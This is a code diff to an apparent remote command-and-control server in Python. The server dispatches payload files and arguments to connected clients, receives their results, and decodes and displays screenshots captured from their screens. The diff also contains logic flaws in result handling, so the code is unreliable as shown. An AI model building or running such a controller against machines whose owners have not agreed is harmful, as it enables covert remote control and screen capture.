@@ -7,8 +7,9 @@ from termcolor import colored
 #for dispaly the refreshing status in sparate cli 
 import subprocess
 from prettytable import PrettyTable
-import platform
 import base64
+import io
+from PIL import ImageGrab , Image
 
 
 # A helper class that represents a client Thread
@@ -26,39 +27,58 @@ class ClientThread(threading.Thread):
         
     # Recive data from the actual client
     def _recv(self ,socket):
-        data = socket.recv(4000)
+        data = b""
+        while True:
+            chunk = socket.recv(4096)
+            if not chunk or b"}" in chunk:
+                data += chunk
+                break
+            data += chunk
         try:
-            deserialized = json.loads(base64.b64decode(data).decode("utf-8"))
-        except (TypeError, ValueError):
-            raise Exception('Data received was not in JSON format')
+            print("out")
+            deserialized = json.loads(data.decode("utf-8"))
+        except (TypeError, ValueError , json.decoder.JSONDecodeError) as e:
+                raise Exception('Data received was not in JSON format' + str(e))
         return deserialized
+        
+    #Add the result of excution to the socket's result and append it to the server command_results
+    def add_result(self , command_id , excution_result):
+         if command_id not in self.command_results:
+            self.command_results[command_id] = []  
+            # add the command result to the ClientTread list by key command_id
+            self.command_results[command_id].append(excution_result)
+            # update the command_results list of ClientTread by key command_id
+            self.server.add_client_command_result(command_id ,self.id , self.command_results)
+            print(colored(f'Received result for command {self.server.COMMANDS[command_id]} from client {self.id} \n' , 'green'))
+            self.data_received.set()
 
     def run(self):
         print(colored("New client connected at time: {} with ID {}".format(self.last_alive_time ,self.id),"green"))
         #add a new client thread to the list of active client threads being handled by the server.
         self.server.add_client_thread(self)
         while self.server.running:
-                message = self._recv(self.conn)
-                if not message:
-                    return
-                result = message['command_result']
-                if result == "exit":
-                            break
-                if message['command_result'] == 'keep_alive':
-                    self.last_alive_time = time.time()
+            message = self._recv(self.conn)
+            if not message:
+                return
+            type = message["command_type"]
+            if type == "exit":
+                break
+            if type == 'keep_alive':
+                self.last_alive_time = time.time()
+            else:
+                command_id = message["command_id"]
+                # print(command_id)
+                result = message["command_result"]
+            if result:
+                if type == "screenshot":
+                    excution_result = base64.b64decode(result.encode('utf-8'))
+                    img_bytes = io.BytesIO(excution_result)
+                    img = Image.open(img_bytes)
+                    img.show()
+                    self.add_result(command_id ,excution_result)
                 else:
-                    command_id = message['command_id']
-                    print(command_id)
-                    if result:
-                        print(result)
-                        if command_id not in self.command_results:
-                            self.command_results[command_id] = []  
-                        # add the command result to the ClientTread list by key command_id
-                        self.command_results[command_id].append(str(result))
-                        # update the command_results list of ClientTread by key command_id
-                        self.server.add_client_command_result(command_id ,self.id , self.command_results)
-                        print(colored(f'Received result for command {self.server.COMMANDS[command_id]} from client {self.id} \n' , 'green'))
-                        self.data_received.set()
+                    print(result)
+                    self.add_result(command_id ,result)
         self.conn.close()
         self.server.remove_client_thread(self.id)
         self.data_received.set()
@@ -119,9 +139,9 @@ class Server:
         print(colored(f"Listening on {self.host}:{self.port}", "green"))
         self.command_thread = threading.Thread(target=self.handle_commands)
         self.command_thread.start()
-        refresh_thread = threading.Thread(target=self.refresh_status, args=(self.refresh_interval,))
-        refresh_thread.daemon = True  # make sure the thread stops when the program exits
-        refresh_thread.start()
+        # refresh_thread = threading.Thread(target=self.refresh_status, args=(self.refresh_interval,))
+        # refresh_thread.daemon = True  # make sure the thread stops when the program exits
+        # refresh_thread.start()
         client_thread = threading.Thread(target=self.listen_for_clients)
         client_thread.start()
 
@@ -312,7 +332,7 @@ class Server:
         with open(filepath, "r") as f:
             command_payload = f.read()
         try:
-            command_args = input(colored("Enter Arguments (with comma-separated): \n" ,"yellow")).split(",")
+            command_args = self.process_arguments()
         except Exception as e:
                 print(f'Error: {str(e)}')
 
@@ -325,6 +345,22 @@ class Server:
         }
         return command
     
+#Take valid arguments input
+    def process_arguments(self):
+        
+        input_str = input(colored("Enter Arguments (with comma-separated): \n" ,"yellow"))
+        # Split the input string into individual arguments by commas
+        arguments = input_str.split(',')
+
+        # Remove any arguments that are equal to "enter" or "space"
+        processed_arguments = []
+        for argument in arguments:
+            argument = argument.strip()  # Remove leading/trailing whitespace
+            if argument.lower() not in (" ", ""):
+                processed_arguments.append(argument)
+
+        return processed_arguments
+    
 
 #Send data to the client    
     def _send(self, socket, data):
@@ -332,8 +368,9 @@ class Server:
             serialized = json.dumps(data)
         except (TypeError, ValueError):
             raise Exception('You can only send JSON-serializable data')
-        encoded_data = base64.b64encode(serialized.encode('utf-8'))
-        socket.sendall(encoded_data)
+        encoded_data = serialized.encode('utf-8')
+        socket.conn.sendall(encoded_data)
+        socket.data_received.wait()
 
 #Sending command_msg to client with id client_id
     def send_cmd(self, client_id, command_msg, command_id):
@@ -342,9 +379,9 @@ class Server:
                 print(colored("Invalid client ID", "red"))
                 return
             target = self.client_threads[client_id]
-        self._send(target.conn ,command_msg)
+        self._send(target ,command_msg)
         print(colored(f'Sent command {self.COMMANDS[command_id]} to client {client_id} \n',"green"))
-        target.data_received.wait()
+       
 
 #Kill client
     def kill_client(self , client):
